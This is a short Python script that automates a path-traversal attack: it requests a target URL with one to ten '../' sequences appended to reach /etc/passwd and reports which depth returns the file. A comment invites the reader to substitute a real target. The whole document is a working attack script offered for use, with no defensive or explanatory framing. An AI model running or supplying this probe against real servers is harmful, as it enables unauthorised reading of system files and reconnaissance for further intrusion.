import urllib.request

def open_file_with_up_directory(url_base, max_up_directories):
    for up_dir_count in range(1, max_up_directories + 1):
        try:
            url = f"{url_base}/{'../' * up_dir_count}etc/passwd"
            response = urllib.request.urlopen(url)
            content = response.read().decode()
            
            if 'root:' in content:
                print(f"Successfully opened /etc/passwd with {up_dir_count} up directories.")
                break
            else:
                print(f"Opened file but 'root:' not found with {up_dir_count} up directories.")
                
        except urllib.error.HTTPError as e:
            if e.code == 404:
                print(f"File not found with {up_dir_count} up directories.")
            else:
                print(f"Error opening file with {up_dir_count} up directories: {e}")
                
        except Exception as e:
            print(f"Error opening file with {up_dir_count} up directories: {e}")

# Example usage
url_base = "http://example.com"  # Replace with your target URL
max_up_directories = 10

open_file_with_up_directory(url_base, max_up_directories)
